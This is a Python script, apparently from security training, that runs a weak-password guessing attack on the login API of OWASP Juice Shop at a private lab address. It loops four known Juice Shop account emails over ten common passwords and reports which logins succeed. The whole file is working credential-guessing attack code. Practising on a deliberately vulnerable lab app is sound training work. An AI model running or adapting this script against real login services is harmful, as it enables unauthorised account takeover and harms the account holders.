#!/usr/bin/env python3
# Проверка слабых паролей для известных email (A07 Authentication Failures)

import requests

TARGET = "http://172.20.0.106:3000"

EMAILS = [
    "admin@juice-sh.op",
    "jim@juice-sh.op",
    "bender@juice-sh.op",
    "amy@juice-sh.op"
]

WEAK_PASSWORDS = [
    "admin123",
    "password",
    "123456",
    "password123",
    "admin",
    "letmein",
    "welcome",
    "monkey",
    "qwerty",
    "123456789"
]

def try_login(email, password):
    url = f"{TARGET}/rest/user/login"
    payload = {"email": email, "password": password}
    try:
        response = requests.post(url, json=payload, timeout=5)
        return response.status_code, response.json()
    except Exception:
        return None, None

def main():
    print("=" * 60)
    print("Testing Weak Passwords (Authentication Failures - A07)")
    print("=" * 60)

    found = 0

    for email in EMAILS:
        print(f"\n[*] Testing {email}")
        for password in WEAK_PASSWORDS:
            status, response = try_login(email, password)
            if status == 200 and "authentication" in str(response):
                print(f"  [+] SUCCESS: {password}")
                found += 1
                break
            else:
                print(f"  [-] Failed: {password}")

    print("\n" + "=" * 60)
    print(f"[+] Found {found}/{len(EMAILS)} accounts with weak passwords")
    print("=" * 60)

if __name__ == "__main__":
    main()
